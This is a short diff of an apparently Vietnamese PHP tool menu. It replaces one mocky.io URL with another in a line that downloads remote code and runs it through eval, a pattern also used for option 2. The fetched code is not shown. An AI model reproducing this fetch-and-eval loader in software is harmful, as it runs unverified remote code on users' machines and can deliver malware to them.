@@ -159,7 +159,7 @@ if ($nhaptool2 == '1'){
     echo 'Vui lòng bật kết nối mạng';
     exit();
 }
-	eval(get('https://run.mocky.io/v3/81e49e65-f17c-49ea-a401-d0a211a4d49e'));
+	eval(get('https://run.mocky.io/v3/c287efcb-b512-42c3-8658-4e7ff58cea70'));
 	
 }else if ($nhaptool2 == '2'){
 	eval(get('https://run.mocky.io/v3/0333123f-7769-4483-9dcf-def972e5af68'));
